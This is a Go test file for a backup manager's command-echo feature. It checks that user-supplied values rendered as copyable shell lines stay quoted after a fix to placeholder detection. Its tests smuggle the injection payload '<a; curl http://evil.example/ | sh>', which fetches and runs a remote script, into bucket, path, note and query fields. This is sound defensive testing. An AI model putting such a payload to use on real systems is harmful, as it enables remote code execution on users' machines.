package cliecho

import (
	"fmt"
	"net/url"
	"strings"
	"testing"

	"github.com/spdrman/rclone-manager/core/cliname"
)

// A rendered line has to mean what the argv meant, and the only reader
// that can say whether it does is one that reads it the way a shell would.
//
// # The bug this is written against
//
// shellQuote used to return any argument beginning with "<" and ending
// with ">" unquoted, on the reasoning that such a thing is a placeholder
// and '<the file you chose>' reads like a filename. That decided
// placeholder-ness by SNIFFING THE TEXT, and the text is caller data:
// every one of --bucket, --endpoint, --prefix, --storage-class,
// --known-hosts-line, --note, --host, --user, --remote-path, --local-path
// and --include carries a string somebody typed into a browser, and a
// path parameter carries one too. A bucket named
// "<a; curl http://evil.example/ | sh>" satisfied the shape test, so it
// rendered as an ordinary runnable command, with a $ prompt in front of
// it and a copy button beside it, and the line did not even say it was
// not runnable as printed.
//
// Placeholder-ness is now carried out of band, by the builder that put
// the placeholder there, so no string a caller can supply can claim it.
func TestCallerDataShapedLikeAPlaceholderIsStillQuoted(t *testing.T) {
	const attack = "<a; curl http://evil.example/ | sh>"

	// One case per builder that puts caller-supplied text on a command
	// line, because "quote what the builder did not mark" is a claim about
	// all of them.
	for _, tc := range []struct {
		name   string
		action Action
	}{
		{"a storage medium's bucket", Action{Method: "POST", Route: "/storage-mediums",
			Body: []byte(fmt.Sprintf(`{"id":"offsite_s3","type":"s3","bucket":%q}`, attack))}},
		{"a storage medium's prefix", Action{Method: "PUT", Route: "/storage-mediums/{id}",
			Params: map[string]string{"id": "offsite_s3"},
			Body:   []byte(fmt.Sprintf(`{"prefix":%q}`, attack))}},
		{"a backup set's remote path", Action{Method: "POST", Route: "/backup-sets",
			Body: []byte(fmt.Sprintf(`{"source_name":"api-server","name":"var-backups","remote_path":%q}`, attack))}},
		{"a patch's known hosts line", Action{Method: "PATCH", Route: "/backup-sets/{source}/{set}",
			Params: map[string]string{"source": "api-server", "set": "var-backups"},
			Body:   []byte(fmt.Sprintf(`{"known_hosts_line":%q}`, attack))}},
		{"a retry's note", Action{Method: "POST", Route: "/backups/{source}/{set}/{name}/retry",
			Params: map[string]string{"source": "api-server", "set": "var-backups", "name": "dump.tar"},
			Body:   []byte(fmt.Sprintf(`{"note":%q}`, attack))}},
		{"a path parameter", Action{Method: "DELETE", Route: "/storage-mediums/{id}",
			Params: map[string]string{"id": attack}}},
		{"an artifact list's query", Action{Method: "GET", Route: "/backups",
			Query: url.Values{"source": []string{attack}}}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			line := Echo(tc.action)
			if len(line.Command) == 0 {
				t.Fatalf("this action built no command at all, so it says nothing about quoting: %+v", line)
			}
			if !containsArg(line.Command, attack) {
				t.Fatalf("the value never reached the argv, so this case checks nothing:\n  %v", line.Command)
			}
			shell := line.Shell()
			if got := splitShell(shell); !equalArgv(got, line.Command) {
				t.Errorf("the rendered line does not read back as the command it was built from.\n  argv:     %q\n  rendered: %s\n  reads as: %q\nA value a caller supplied went onto the line unquoted, so a shell would take part of it as its own syntax.",
					line.Command, shell, got)
			}
			if strings.Contains(shell, attack) && !strings.Contains(shell, "'"+attack+"'") {
				t.Errorf("the attack string sits on the line unquoted:\n  %s", shell)
			}
		})
	}
}

// The property, over every route and a corpus of bodies whose every
// string field is shell metacharacters wrapped in angle brackets: what
// Shell() renders reads back as exactly the argv it was built from, with
// a placeholder the builder MARKED as the one thing allowed to split into
// several words.
func TestEveryRenderedLineReadsBackAsItsArgv(t *testing.T) {
	nasty := func(path string) string {
		return "<" + path + "; curl http://evil.example/ | sh>"
	}
	bodies := canaryBodies(t, nasty)

	params := map[string]string{
		"source": nasty("source"),
		"set":    nasty("set"),
		"name":   nasty("name"),
		"id":     nasty("id"),
	}
	query := url.Values{
		"backup_set": []string{nasty("backup_set")},
		"source":     []string{nasty("source")},
		"limit":      []string{"25"},
	}

	checked := 0
	for _, route := range Routes() {
		method, path, _ := strings.Cut(route, " ")
		for _, body := range bodies {
			line := Echo(Action{Method: method, Route: path, Params: params, Query: query, Body: body.body})
			if len(line.Command) == 0 {
				continue
			}
			checked++
			want := make([]string, 0, len(line.Command))
			for i, arg := range line.Command {
				if line.placeholderAt[i] {
					// The one thing that may become several words, and
					// only because the builder said so rather than
					// because the text looked like it: the line carrying
					// it already says it is not runnable as printed.
					want = append(want, splitShell(arg)...)
					continue
				}
				want = append(want, arg)
			}
			if got := splitShell(line.Shell()); !equalArgv(got, want) {
				t.Fatalf("%s with a %s body renders a line that does not read back as its argv.\n  argv:     %q\n  rendered: %s\n  reads as: %q",
					route, body.schema, line.Command, line.Shell(), got)
			}
		}
	}
	if checked == 0 {
		t.Fatal("no route built a command from any of these bodies, so this test proves nothing")
	}
}

// The control for the case above: a placeholder is still rendered bare,
// because that is the display this feature ships and the fix was supposed
// to change where placeholder-ness comes from rather than what it looks
// like.
func TestAMarkedPlaceholderIsStillRenderedWithoutQuotes(t *testing.T) {
	line := Echo(Action{Method: "PUT", Route: "/backup-sets/{source}/{set}/retention",
		Params: map[string]string{"source": "api-server", "set": "var-backups"},
		Body:   []byte(`{"tiers":[{"name":"daily","granularity":"day","keep":7}]}`)})
	const want = cliname.Binary + " backup-set retention api-server/var-backups --policy-file <a file holding this whole retention: block>"
	if got := line.Shell(); got != want {
		t.Errorf("a placeholder renders as\n  %s\nwant\n  %s", got, want)
	}
	if !line.Placeholder {
		t.Error("the line does not say it is not runnable as printed")
	}
}

func containsArg(argv []string, want string) bool {
	for _, arg := range argv {
		if arg == want {
			return true
		}
	}
	return false
}

func equalArgv(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}
